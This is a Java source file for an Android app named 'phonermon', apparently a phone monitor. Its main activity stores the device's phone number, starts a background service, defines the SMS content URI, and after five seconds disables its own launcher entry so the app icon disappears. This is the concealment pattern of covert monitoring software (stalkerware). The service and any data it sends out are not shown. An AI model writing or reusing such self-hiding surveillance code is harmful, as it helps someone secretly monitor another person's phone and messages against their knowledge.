package com.my.phonermon;

import java.util.List;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.View.OnClickListener;

import com.my.phonermon.utils.SPUtils;
import com.my.phonermon.utils.TelephoneUtils;

public class MainActivity extends BaseActivity {

	public static final String URI_SMS = "content://sms";

	private void initLocalPhoneNumber() {
		List<String> list = TelephoneUtils.getTelephoneListByDisplayname(Constants.MY_PHONE_NUMBER_KEY);
		if (list.size() > 0) {
			SPUtils spUtils = new SPUtils(this);
			spUtils.setString("localPhoneNumber", list.get(0));
		}

	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		initLocalPhoneNumber();
		Intent intent = new Intent(MainActivity.this, ScreenBroadcastService.class);
		startService(intent);
		new Handler().postDelayed(new Runnable() {
			@Override
			public void run() {
				if(!isFinishing()){
					finish();
					hideAppIcon();
				}
			}
		}, 5000);
		
//		findViewById(R.id.btn).setOnClickListener(new OnClickListener() {
//			@Override
//			public void onClick(View v) {
//				
//			}
//		});
	}
	
	private void hideAppIcon(){
		PackageManager pm = getPackageManager();
		ComponentName componentName = new ComponentName(this, MainActivity.class);
		pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
	}

}
